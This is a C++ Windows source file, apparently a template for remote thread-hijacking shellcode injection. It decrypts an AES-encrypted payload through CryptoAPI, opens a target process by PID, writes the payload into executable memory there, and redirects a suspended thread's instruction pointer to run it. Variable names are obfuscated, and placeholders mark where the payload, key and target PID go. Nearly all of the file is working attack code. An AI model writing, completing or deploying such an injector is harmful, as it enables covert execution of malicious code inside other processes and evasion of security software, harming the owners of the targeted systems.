#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

int z16(char* z17, unsigned int z18, char* z19, size_t z20) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)z19, (DWORD)z20, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)z17, (DWORD*)&z18)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}

int main()
{
	*1
	*2

	unsigned int shellcode_len = sizeof(payload);

	HANDLE z10;
	PVOID z11;
	HANDLE z12 = NULL;
	HANDLE z13;
	THREADENTRY32 z14;
	CONTEXT z15;

	// CHANGE ME
	DWORD targetPID = *3;
	z15.ContextFlags = CONTEXT_FULL;
	z14.dwSize = sizeof(THREADENTRY32);

	z10 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);

	z16((char*)payload, shellcode_len, (char*)key, sizeof(key));

	z11 = VirtualAllocEx(z10, NULL, sizeof payload, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(z10, z11, payload, sizeof payload, NULL);

	z13 = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(z13, &z14);

	while (Thread32Next(z13, &z14))
	{
		if (z14.th32OwnerProcessID == targetPID)
		{
			z12 = OpenThread(THREAD_ALL_ACCESS, FALSE, z14.th32ThreadID);
			break;
		}
	}

	SuspendThread(z12);

	GetThreadContext(z12, &z15);
	z15.Rip = (DWORD_PTR)z11;
	SetThreadContext(z12, &z15);

	ResumeThread(z12);
}